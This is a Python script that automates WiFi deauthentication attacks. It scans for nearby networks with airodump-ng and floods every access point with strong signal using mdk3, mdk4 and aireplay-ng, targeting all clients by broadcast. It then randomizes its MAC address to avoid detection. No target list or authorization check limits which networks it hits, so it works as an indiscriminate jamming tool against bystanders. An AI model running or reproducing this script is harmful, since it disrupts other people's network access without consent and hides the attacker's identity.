#!/usr/bin/env python3

"""
Auto-Deauth System with MDK3/MDK4 - Signal Detection & Trigger
Works with standard WiFi routers, no extra hardware needed
Detects BSSID/SSID and triggers automatic deauthentication
"""

import subprocess
import re
import sys
import time
import os
import logging
from datetime import datetime
import signal
import json

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/wifi-auto-deauth.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class WifiAutoDeauth:
    def __init__(self, interface='wlan0', scan_interval=5, deauth_count=10):
        """
        Initialize auto-deauth system
        
        Args:
            interface: Wireless interface name
            scan_interval: Time between scans (seconds)
            deauth_count: Number of deauth packets to send
        """
        self.interface = interface
        self.scan_interval = scan_interval
        self.deauth_count = deauth_count
        self.detected_networks = {}
        self.running = True
        self.monitor_mode = False
        
    def check_requirements(self):
        """Verify required tools are installed"""
        tools = ['airodump-ng', 'aireplay-ng', 'mdk3', 'mdk4', 'airmon-ng', 'macchanger']
        missing = []
        
        for tool in tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing.append(tool)
        
        if missing:
            logger.error(f"Missing tools: {', '.join(missing)}")
            logger.info("Install with: sudo apt-get install aircrack-ng mdk3 mdk4 macchanger")
            return False
        
        logger.info("✓ All required tools found")
        return True
    
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        try:
            logger.info(f"[*] Enabling monitor mode on {self.interface}...")
            
            # Kill interfering processes
            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                         capture_output=True, timeout=5)
            
            # Enable monitor mode
            result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface],
                                  capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                # Get the monitor interface name (usually wlan0mon)
                if 'mon' in result.stdout:
                    match = re.search(r'(\w+mon\d*)', result.stdout)
                    if match:
                        self.interface = match.group(1)
                
                logger.info(f"✓ Monitor mode enabled: {self.interface}")
                self.monitor_mode = True
                time.sleep(2)
                return True
            else:
                logger.error(f"Failed to enable monitor mode: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode"""
        try:
            logger.info(f"[*] Disabling monitor mode on {self.interface}...")
            subprocess.run(['sudo', 'airmon-ng', 'stop', self.interface],
                         capture_output=True, timeout=10)
            logger.info("✓ Monitor mode disabled")
        except Exception as e:
            logger.error(f"Error disabling monitor mode: {e}")
    
    def scan_networks(self):
        """Scan for available WiFi networks using airodump-ng"""
        try:
            logger.info("[*] Scanning for networks...")
            
            # Run airodump-ng for 10 seconds
            cmd = ['sudo', 'timeout', '10', 'airodump-ng', '--output-format', 'csv', 
                   '-w', '/tmp/scan', self.interface]
            
            subprocess.run(cmd, capture_output=True, timeout=15)
            
            networks = {}
            csv_file = '/tmp/scan-01.csv'
            
            if os.path.exists(csv_file):
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                    
                    # Parse airodump CSV format
                    for line in lines:
                        if line.strip() and not line.startswith('BSSID'):
                            parts = [x.strip() for x in line.split(',')]
                            
                            if len(parts) >= 8:
                                try:
                                    bssid = parts[0]
                                    power = int(parts[8]) if parts[8] else -100
                                    ssid = parts[13] if len(parts) > 13 else 'Hidden'
                                    
                                    # Validate BSSID format (XX:XX:XX:XX:XX:XX)
                                    if re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', bssid):
                                        networks[bssid] = {
                                            'ssid': ssid,
                                            'power': power,
                                            'timestamp': datetime.now().isoformat()
                                        }
                                except (ValueError, IndexError):
                                    continue
                
                logger.info(f"✓ Found {len(networks)} networks")
                return networks
            
            return {}
            
        except subprocess.TimeoutExpired:
            logger.warning("Scan timeout")
            return {}
        except Exception as e:
            logger.error(f"Scan error: {e}")
            return {}
    
    def randomize_mac(self):
        """Randomize MAC address to avoid detection"""
        try:
            logger.info("[*] Randomizing MAC address...")
            
            # Bring interface down
            subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', self.interface, 'down'],
                         capture_output=True, timeout=5)
            time.sleep(1)
            
            # Change MAC
            subprocess.run(['sudo', 'macchanger', '-r', self.interface],
                         capture_output=True, timeout=5)
            time.sleep(1)
            
            # Bring interface up
            subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', self.interface, 'up'],
                         capture_output=True, timeout=5)
            time.sleep(1)
            
            logger.info("✓ MAC address randomized")
            
        except Exception as e:
            logger.warning(f"MAC randomization failed: {e}")
    
    def deauth_mdk3(self, bssid, ssid):
        """Send deauth using MDK3 (most effective)"""
        try:
            logger.info(f"[*] MDK3 Deauth → BSSID: {bssid} | SSID: {ssid}")
            
            # MDK3 deauth command (no client specified = all clients)
            cmd = ['sudo', 'mdk3', self.interface, 'd', '-b', bssid, '-c', '1,6,11']
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, text=True)
            
            # Run for specified duration
            time.sleep(3)
            process.terminate()
            
            logger.info(f"✓ MDK3 deauth sent to {bssid}")
            return True
            
        except FileNotFoundError:
            logger.warning("MDK3 not found, trying alternative...")
            return False
        except Exception as e:
            logger.error(f"MDK3 deauth error: {e}")
            return False
    
    def deauth_mdk4(self, bssid, ssid):
        """Send deauth using MDK4 (alternative method)"""
        try:
            logger.info(f"[*] MDK4 Deauth → BSSID: {bssid} | SSID: {ssid}")
            
            # MDK4 deauth command
            cmd = ['sudo', 'mdk4', self.interface, 'd', '-b', bssid]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, text=True)
            
            time.sleep(3)
            process.terminate()
            
            logger.info(f"✓ MDK4 deauth sent to {bssid}")
            return True
            
        except FileNotFoundError:
            logger.warning("MDK4 not found")
            return False
        except Exception as e:
            logger.error(f"MDK4 deauth error: {e}")
            return False
    
    def deauth_aireplay(self, bssid):
        """Send deauth using aireplay-ng (fallback)"""
        try:
            logger.info(f"[*] Aireplay Deauth → BSSID: {bssid}")
            
            # Aireplay deauth: -0 = deauth packets, count, bssid, broadcast
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(self.deauth_count), 
                   '-a', bssid, '-c', 'FF:FF:FF:FF:FF:FF', self.interface]
            
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            
            if result.returncode == 0:
                logger.info(f"✓ Aireplay deauth sent to {bssid}")
                return True
            
        except Exception as e:
            logger.error(f"Aireplay deauth error: {e}")
            return False
    
    def execute_deauth(self, bssid, ssid):
        """Execute deauthentication using multiple methods"""
        try:
            logger.info(f"\n{'='*60}")
            logger.info(f"[!] DEAUTH TRIGGERED")
            logger.info(f"    BSSID: {bssid}")
            logger.info(f"    SSID:  {ssid}")
            logger.info(f"    Time:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            logger.info(f"{'='*60}")
            
            # Try MDK3 first (most effective)
            if self.deauth_mdk3(bssid, ssid):
                time.sleep(2)
            
            # Follow up with MDK4
            if self.deauth_mdk4(bssid, ssid):
                time.sleep(2)
            
            # Fallback to aireplay-ng
            self.deauth_aireplay(bssid)
            
            # Random MAC after successful deauth
            self.randomize_mac()
            
            logger.info(f"[✓] Deauth cycle complete for {ssid}\n")
            
        except Exception as e:
            logger.error(f"Deauth execution error: {e}")
    
    def monitor_and_deauth(self):
        """Main loop: scan networks and trigger deauth on detection"""
        try:
            logger.info("\n" + "="*60)
            logger.info("AUTO-DEAUTH SYSTEM STARTED")
            logger.info("="*60)
            logger.info(f"Interface: {self.interface}")
            logger.info(f"Scan Interval: {self.scan_interval}s")
            logger.info("Status: LISTENING FOR SIGNALS...")
            logger.info("="*60 + "\n")
            
            scan_count = 0
            
            while self.running:
                scan_count += 1
                logger.info(f"[Scan #{scan_count}] Checking for networks...")
                
                # Scan networks
                networks = self.scan_networks()
                
                if networks:
                    for bssid, info in networks.items():
                        ssid = info['ssid']
                        power = info['power']
                        
                        # Log detected network
                        if bssid not in self.detected_networks:
                            logger.info(f"[+] NEW NETWORK DETECTED: {ssid} ({bssid}) | Power: {power}dBm")
                            self.detected_networks[bssid] = info
                        
                        # Trigger deauth on signal detection
                        if power > -80:  # Strong signal detected
                            self.execute_deauth(bssid, ssid)
                            
                            # Wait before next scan
                            time.sleep(10)
                else:
                    logger.warning("[!] No networks found in scan")
                
                # Wait for next scan cycle
                logger.info(f"[*] Waiting {self.scan_interval}s until next scan...\n")
                time.sleep(self.scan_interval)
                
        except KeyboardInterrupt:
            logger.info("\n[*] Shutting down gracefully...")
        except Exception as e:
            logger.error(f"Monitor loop error: {e}")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Cleanup and restore system state"""
        logger.info("[*] Cleaning up...")
        self.running = False
        
        if self.monitor_mode:
            self.disable_monitor_mode()
        
        logger.info("✓ Cleanup complete")
        logger.info("="*60)
        logger.info("AUTO-DEAUTH SYSTEM STOPPED")
        logger.info("="*60)
    
    def save_log(self):
        """Save detected networks to JSON log"""
        try:
            log_file = f"/tmp/deauth_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(log_file, 'w') as f:
                json.dump(self.detected_networks, f, indent=2)
            logger.info(f"Log saved: {log_file}")
        except Exception as e:
            logger.error(f"Failed to save log: {e}")

def signal_handler(sig, frame):
    """Handle CTRL+C gracefully"""
    print("\n")
    sys.exit(0)

def main():
    """Main entry point"""
    if os.geteuid() != 0:
        print("ERROR: This script must be run as root!")
        print("Usage: sudo python3 auto_deauth.py")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Get interface from argument or use default
    interface = sys.argv[1] if len(sys.argv) > 1 else 'wlan0'
    
    # Initialize system
    system = WifiAutoDeauth(interface=interface)
    
    # Check requirements
    if not system.check_requirements():
        sys.exit(1)
    
    # Enable monitor mode
    if not system.enable_monitor_mode():
        sys.exit(1)
    
    # Start monitoring and deauth
    try:
        system.monitor_and_deauth()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
    finally:
        system.cleanup()

if __name__ == '__main__':
    main()
